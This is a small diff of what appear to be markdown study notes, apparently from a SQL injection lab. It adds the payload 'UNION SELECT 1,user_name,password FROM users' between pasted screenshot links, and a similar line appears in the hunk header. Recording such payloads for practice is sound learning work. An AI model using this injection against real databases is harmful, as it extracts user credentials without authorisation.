@@ -349,6 +349,8 @@ UNION SELECT 1,user_name,password FROM users--
 
 ![[Pasted image 20260605112115.png]]
 
+UNION SELECT 1,user_name,password FROM users
+
 ![[Pasted image 20260605112144.png]]
 
 ![[Pasted image 20260605112157.png]]
